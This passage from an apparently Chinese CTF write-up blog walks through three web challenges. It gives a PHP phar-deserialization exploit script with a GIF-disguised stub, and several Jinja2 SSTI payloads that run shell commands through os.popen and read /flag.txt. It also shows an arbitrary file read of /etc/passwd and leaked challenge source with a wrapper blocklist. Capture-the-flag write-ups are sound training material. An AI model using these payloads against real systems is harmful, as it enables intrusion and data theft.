class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>base.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090905238.png" alt="image-20241129090905238"></p><p><strong>upload_file.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129091157168.png" alt="image-20241129091157168"></p><p>然后我们需要进行的就是代码审计</p><p>上传的文件后缀限定为白名单，且会强制改成.jpg，那么正常的文件上传漏洞就不存在了，得想其他办法，源码中其实也给了提示，phar反序列化，给了文件包含的点，也给了文件上传的点，那么就可以利用phar反序列化了。那么接下来就要找链条了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1e4r::__destruct() -&gt; Show::__toString() -&gt; Test::__get() -&gt; Test::get() -&gt; Test::file_get()</span><br></pre></td></tr></table></figure><p>链子拿捏了，构造就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//设置stub，添加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></figure><p>然后将phar文件后缀改成jpg，上传后在upload目录下获取名称然后在file.php文件下进行phar文件包含即可获取flag</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129094525150.png" alt="image-20241129094525150"></p><h2 id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h2><p>扫目录发现&#x2F;secret目录</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129152014405.png" alt="image-20241129152014405"></p><p>传入secret参数后会加密后进行回显，11111就报错了，同时发现泄露了部分源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p>一眼ssti</p><p>RC4加密后用render_template_string进行模板渲染，RC4密钥为HereIsTreasure，同时用safe()函数对恶意代码进行过滤</p><p>那接下来就试着ssti</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153324392.png" alt="image-20241129153324392"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153330890.png" alt="image-20241129153330890"></p><p>那就</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2]&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样就能获得object了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153602396.png" alt="image-20241129153602396"></p><p>然后不知道找哪个类了，网上说用warnings.catch_warnings类然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是我不太行啊，不知道为啥。</p><p>后来用config直接试，居然可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154720280.png" alt="image-20241129154720280"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154816344.png" alt="image-20241129154816344"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>NSSCTF{2503893c-a2dd-44f5-822d-40536acbabd0}</p><p>后来又回归之前的payload，用&lt;class ‘site._Printer’&gt;类里面的globals有os模块，是可以用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>warnings.catch_warnings类有open模块，可以直接打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="TQLCTF-2022-simple-bypass"><a href="#TQLCTF-2022-simple-bypass" class="headerlink" title="[TQLCTF 2022]simple_bypass"></a>[TQLCTF 2022]simple_bypass</h2><p>注册登陆一下就好，在好康的处发现php的跳转，发现那里可能存在任意文件读取</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162734692.png" alt="image-20241129162734692"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28995/get_pic.php?image=/etc/passwd</span><br></pre></td></tr></table></figure><p>然后查看源代码获取一串base64</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162758249.png" alt="image-20241129162758249" style="zoom:67%;" /><p>实锤了！任意文件读取，那就读取一下当前的这个文件吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$image</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;img&quot;&gt; &lt;img src=&quot;data:image/png;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>)) . <span class="string">&#x27;&quot; /&gt; &lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没啥用，那就看看index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$hash_user</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"><span class="variable">$hash_pass</span> = <span class="string">&#x27;zsf&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//filter</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;sandbox/&#x27;</span>.<span class="variable">$hash_user</span>.<span class="string">&#x27;.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>, <span class="variable">$hash_pass</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:sandbox/<span class="subst">$hash_user</span>.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt; </span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Simple Linux&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;css/styles.css&quot;</span>&gt;</span><br><span class="line">&lt;!--[<span class="keyword">if</span> IE]&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;![<span class="keyword">endif</span>]--&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">jq22</span>-<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">wrap</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">html</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>&quot; <span class="title">checked</span>&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">In</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">tab</span>&quot; <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-2&quot; <span class="title">class</span>=&quot;<span class="title">tab</span>&quot;&gt;<span class="title">Sign</span> <span class="title">Up</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">in</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">check</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">class</span>=&quot;<span class="title">check</span>&quot; <span class="title">checked</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">check</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;/<span class="title">span</span>&gt; <span class="title">Keep</span> 